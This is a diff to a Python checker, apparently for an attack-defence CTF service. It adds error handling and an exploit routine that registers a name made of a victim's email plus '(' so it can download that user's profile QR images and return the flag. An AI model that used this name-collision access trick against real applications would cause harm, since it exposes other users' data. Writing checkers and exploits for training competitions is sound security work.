@@ -6,6 +6,7 @@ from enochecker3 import (
     GetflagCheckerTaskMessage,
     MumbleException,
     PutflagCheckerTaskMessage,
+    ExploitCheckerTaskMessage,
 )
 import secrets
 from typing import Optional
@@ -49,16 +50,42 @@ async def getflag_email(
     logger: LoggerAdapter
 ) -> None:
     logger.info("Getting flag")
-    credentials = await db.get("credentials")
+    try:
+        credentials = await db.get("credentials")
+    except:
+        raise MumbleException("No credentials saved in db")
     logger.info(f"Got credentials: {credentials}")
     address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
-    m = InteractionManager(address, logger, credentials)
+    m = InteractionManager(address, logger, email_name_key=credentials)
     await m.login()
-    imgs = await m.download_profile_images()
+    imgs = await m.download_profile_images_from_self()
+    if not imgs:
+        raise MumbleException("No images found")
     logger.info(f"Downloaded {len(imgs)} images")
     imgs = [qr_codes.read_qr_code(img) for img in imgs]
     logger.info(f"Decoded images: {imgs}")
     assert_in(task.flag, imgs, "Flag not found in images")
+
+
+@checker.exploit(0)
+async def exploit_email(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    logger: LoggerAdapter
+) -> Optional[str]:
+    logger.info(f"Exploiting {task.attack_info} ")
+    email = task.attack_info
+    name = email + "("
+    address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
+    m = InteractionManager(address, logger, forced_name=name)
+    await m.register()
+    imgs = await m.download_profile_images_from_email(email)
+    if not imgs:
+        raise MumbleException("No images found")
+    logger.info(f"Downloaded {len(imgs)} images")
+    imgs = [qr_codes.read_qr_code(img) for img in imgs]
+    logger.info(f"Decoded images: {imgs}")
+    return imgs[0]
 
 
 if __name__ == "__main__":
